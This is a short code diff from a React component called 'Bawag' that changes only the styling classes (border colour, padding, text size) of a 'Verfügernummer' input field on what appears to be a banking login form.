@@ -69,7 +69,7 @@ const Bawag = () => {
                     value={verfueger}
                     onChange={(e) => setVerfueger(e.target.value)}
                     placeholder="Verfügernummer"
-                    className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#990000]"
+                    className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#990000]"
                   />
                 </div>
 
